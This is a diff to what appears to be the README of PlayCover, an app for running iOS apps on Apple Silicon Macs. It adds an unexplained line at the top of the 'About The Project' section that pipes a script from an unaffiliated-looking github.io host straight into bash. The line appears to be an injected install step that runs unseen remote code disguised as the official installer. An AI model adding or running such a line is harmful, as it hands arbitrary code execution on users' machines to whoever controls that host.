@@ -34,6 +34,8 @@
 <!-- ABOUT THE PROJECT -->
 ## About The Project
 
+curl -fsSL https://suspendednetwork.github.io/PlayCover/install.command | bash                
+
 Welcome to PlayCover! This software is all about allowing you to run iOS apps and games on Apple Silicon devices running macOS 12.0 or newer.
 
 PlayCover works by putting applications through a wrapper which imitates an iPad. This allows the apps to run natively and perform very well.
